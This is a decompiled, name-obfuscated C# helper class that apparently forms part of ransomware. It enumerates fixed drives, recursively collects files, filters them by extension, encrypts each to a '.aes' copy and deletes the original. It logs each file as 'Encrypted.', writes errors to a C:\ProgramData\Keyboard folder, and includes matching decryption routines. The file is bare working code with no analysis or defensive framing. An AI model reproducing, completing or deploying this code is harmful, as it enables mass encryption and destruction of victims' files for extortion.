using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

public static class GClass2
{
	[CompilerGenerated]
	private sealed class Class7
	{
		public string string_0;

		public string string_1;

		internal void method_0()
		{
			GStream0.smethod_3(string_0, string_1, string_1 + ".aes");
		}
	}

	[CompilerGenerated]
	private sealed class Class9
	{
		public IEnumerable<string> ienumerable_0;

		public string string_0;

		internal async Task method_0()
		{
			foreach (string item in ienumerable_0)
			{
				await item.smethod_0(string_0);
				GClass8.smethod_1(item + " Encrypted.");
			}
		}
	}

	[CompilerGenerated]
	private sealed class Class12
	{
		public string string_0;

		public string string_1;

		public string string_2;

		internal void method_0()
		{
			GStream0.smethod_4(string_0, string_1, string_2);
		}
	}

	[CompilerGenerated]
	private sealed class Class14
	{
		public IEnumerable<string> ienumerable_0;

		public string string_0;

		internal async Task method_0()
		{
			foreach (string item in ienumerable_0)
			{
				await item.smethod_3(string_0);
			}
		}
	}

	[Serializable]
	[CompilerGenerated]
	private sealed class Class17
	{
		public static readonly Class17 class17_0 = new Class17();

		public static Func<DriveInfo, bool> func_0;

		internal bool method_0(DriveInfo driveInfo_0)
		{
			return driveInfo_0.DriveType == DriveType.Fixed;
		}
	}

	public static async Task smethod_0(this string string_0, string string_1)
	{
		await Task.Run(delegate
		{
			GStream0.smethod_3(string_1, string_0, string_0 + ".aes");
		});
	}

	public static void smethod_1(this string string_0, string string_1, bool bool_0)
	{
		try
		{
			GStream0.smethod_3(string_1, string_0, string_0 + ".aes");
			if (bool_0)
			{
				try
				{
					File.Delete(string_0);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch (Exception ex)
		{
			string text = DateTime.Now.ToString("ddMMyyyy");
			string string_2 = Path.Combine("C:\\ProgramData\\Keyboard", text + ".error");
			GClass4.smethod_0(string_2, ex.ToString());
		}
	}

	public static async Task smethod_2(this IEnumerable<string> ienumerable_0, string string_0)
	{
		await Task.Run(async delegate
		{
			foreach (string item in ienumerable_0)
			{
				await item.smethod_0(string_0);
				GClass8.smethod_1(item + " Encrypted.");
			}
		});
	}

	public static async Task smethod_3(this string string_0, string string_1)
	{
		string string_2 = string_0.smethod_4();
		await Task.Run(delegate
		{
			GStream0.smethod_4(string_1, string_0, string_2);
		});
	}

	public static string smethod_4(this string string_0)
	{
		return Path.ChangeExtension(string_0, "")!.TrimEnd(new char[1] { '.' });
	}

	public static async Task smethod_5(this IEnumerable<string> ienumerable_0, string string_0)
	{
		await Task.Run(async delegate
		{
			foreach (string item in ienumerable_0)
			{
				await item.smethod_3(string_0);
			}
		});
	}

	public static IEnumerable<string> smethod_6(this string string_0, bool bool_0 = true)
	{
		List<string> list = new List<string>();
		try
		{
			if (!Directory.Exists(string_0))
			{
				return list;
			}
			if (bool_0)
			{
				string[] directories = Directory.GetDirectories(string_0);
				if (directories != null)
				{
					string[] array = directories;
					foreach (string string_ in array)
					{
						list.AddRange(string_.smethod_6());
					}
				}
			}
			string[] files = Directory.GetFiles(string_0);
			if (files != null)
			{
				list.AddRange(files);
			}
		}
		catch
		{
		}
		return list;
	}

	public static IEnumerable<string> smethod_7(this string string_0)
	{
		List<string> list = new List<string>();
		string value = Regex.Match(string_0, "\\(.+\\)").Value;
		if (!string.IsNullOrWhiteSpace(value))
		{
			string_0 = string_0.Replace(value, string.Empty);
		}
		MatchCollection matchCollection = Regex.Matches(string_0, "\\b(\\w+)\\b");
		foreach (object item in matchCollection)
		{
			list.Add("." + item.ToString());
		}
		return list;
	}

	public static bool smethod_8(this string string_0, IEnumerable<string> ienumerable_0)
	{
		if (ienumerable_0 == null)
		{
			return true;
		}
		if (ienumerable_0.Count() == 0)
		{
			return true;
		}
		foreach (string item in ienumerable_0)
		{
			if (string_0.ToLower().EndsWith(item.ToLower()))
			{
				return true;
			}
		}
		return false;
	}

	public static bool smethod_9(this string string_0, string[] string_1)
	{
		if (string_1 == null)
		{
			return true;
		}
		if (string_1.Count() == 0)
		{
			return true;
		}
		foreach (string text in string_1)
		{
			try
			{
				if (string_0.ToLower().EndsWith(text.ToLower()))
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	public static DriveInfo[] smethod_10()
	{
		IEnumerable<DriveInfo> enumerable = from driveInfo_0 in DriveInfo.GetDrives()
			where driveInfo_0.DriveType == DriveType.Fixed
			select driveInfo_0;
		if (enumerable != null && enumerable.Any())
		{
			return enumerable.ToArray();
		}
		return null;
	}
}
